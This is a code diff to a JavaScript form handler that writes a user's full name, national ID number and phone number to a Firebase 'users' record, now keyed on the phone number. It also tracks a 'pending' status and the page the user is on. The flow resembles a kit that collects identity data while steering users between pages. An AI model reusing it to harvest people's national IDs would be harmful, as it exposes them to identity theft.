@@ -2,8 +2,8 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 
 import {
     getFirestore,
-    collection,
-    addDoc
+    doc,
+    setDoc
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 /* firebase */
@@ -95,25 +95,26 @@ form.addEventListener('submit', async function(e){
 
     try{
 
-        const docRef = await addDoc(collection(db,"users"),{
+        const userId =
+    encodeURIComponent(phoneNumber);
 
-            name: fullName,
+await setDoc(doc(db,"users",userId),{
 
-            nationalId: idNumber,
+    name: fullName,
 
-            phone: phoneNumber,
+    nationalId: idNumber,
 
-            status: "pending",
+    phone: phoneNumber,
 
-            currentPage: "waitaccount.html",
+    status: "pending",
 
-            createdAt: Date.now()
+    currentPage: "login.html",
 
-        });
+    createdAt: Date.now()
 
-        /* save firebase user id */
+},{ merge:true });
 
-        localStorage.setItem("userId",docRef.id);
+localStorage.setItem("userId", userId);
 
     }catch(error){
 
